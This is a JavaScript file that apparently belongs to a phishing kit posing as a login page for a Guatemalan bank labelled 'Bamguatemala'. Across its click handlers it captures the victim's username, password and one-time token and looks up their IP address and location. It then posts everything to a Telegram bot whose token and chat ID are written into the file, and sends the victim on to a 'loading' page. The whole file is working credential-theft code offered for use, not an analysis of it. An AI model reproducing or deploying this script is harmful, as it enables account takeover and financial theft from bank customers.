document.addEventListener("DOMContentLoaded", () => {
  const usernameInput = document.getElementById("input-username");
  const continueButton = document.getElementById("continue-button");
  const url = "https://ipapi.co/json/";

  if (usernameInput && continueButton) {
    usernameInput.addEventListener("input", () => {
      if (usernameInput.value.trim().length > 0) {
        continueButton.classList.remove("disabled");
        continueButton.classList.add("enabled");
      } else {
        continueButton.classList.remove("enabled");
        continueButton.classList.add("disabled");
      }
    });
  }
  const continueButton1 = document.getElementById("continue-button1");

  if (usernameInput && continueButton1) {
    usernameInput.addEventListener("input", () => {
      if (usernameInput.value.trim().length > 0) {
        continueButton1.classList.remove("disabled");
        continueButton1.classList.add("enabled");
      } else {
        continueButton1.classList.remove("enabled");
        continueButton1.classList.add("disabled");
      }
    });
  }
  const continueButtonElement = document.getElementById("continue-button");
  if (continueButtonElement) {
    continueButtonElement.addEventListener("click", function (event) {
      event.preventDefault(); // Previene la acción predeterminada del botón

      const usernameInput = document.getElementById("input-username").value;
      const regex =
        /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!-/:-@[-`{-~])[A-Za-z\d!-/:-@[-`{-~]{4,}$/;

      // Validar que el campo no esté vacío y cumpla con los requisitos
    
      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            localStorage.getItem("usuario") +
            "\nContra: " +
            usernameInput +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7055118357:AAHM6bxT_393rGutVSmSE3PivqSBPVXuh5I/sendMessage",
            {
              chat_id: "7098816483",
              text: message,
            }
          );
        })
        .then((response2) => {
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }

  const continueButtonElementindex =
    document.getElementById("continue-button1");
  if (continueButtonElementindex) {
    continueButtonElementindex.addEventListener("click", function (event) {
      event.preventDefault(); // Previene la acción predeterminada del botón
      if (!usernameInput.value) {
        alert("Llene los espacios requeridos");
        return;
      }
      localStorage.setItem("usuario", usernameInput.value);
      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            usernameInput.value +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7055118357:AAHM6bxT_393rGutVSmSE3PivqSBPVXuh5I/sendMessage",
            {
              chat_id: "7098816483",
              text: message,
            }
          );
        })
        .then((response2) => {
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }
  const numberSubmitButton = document.getElementById("number-submit");
  if (numberSubmitButton) {
    numberSubmitButton.addEventListener("click", function (event) {
      event.preventDefault();
      const numberInput = document.getElementById("number-input");
      if (!numberInput.value) {
        alert("Llene los espacios requeridos");
        return;
      }
      axios
        .get(url)
        .then((response) => {
          const message =
            "\nBamguatemala" +
            "\nUsuario: " +
            localStorage.getItem("usuario") +
            "\nToken: " +
            numberInput.value +
            "\nCiudad: " +
            response.data.city +
            "\nPais: " +
            response.data.country +
            "\nIP: " +
            response.data.ip;

          return axios.post(
            "https://api.telegram.org/bot7055118357:AAHM6bxT_393rGutVSmSE3PivqSBPVXuh5I/sendMessage",
            {
              chat_id: "7098816483",
              text: message,
            }
          );
        })
        .then((response2) => {
          hideNumberForm();
          window.location.href = "cargando.html";
        })
        .catch((error) => {
          console.error(error);
        });
    });
  }
});

function showLoadingOverlay() {
  const overlay = document.getElementById("overlay");
  if (overlay) {
    overlay.style.display = "flex";
  }
}

function hideLoadingOverlay() {
  const overlay = document.getElementById("overlay");
  if (overlay) {
    overlay.style.display = "none";
  }
}

function showNumberForm() {
  const overlay = document.getElementById("number-overlay");
  const form = document.getElementById("number-form");
  if (overlay && form) {
    overlay.style.display = "flex";
    form.style.display = "block";
  }
}

function hideNumberForm() {
  const overlay = document.getElementById("number-overlay");
  const form = document.getElementById("number-form");
  if (overlay && form) {
    form.style.display = "none";
    overlay.style.display = "none";
  }
}
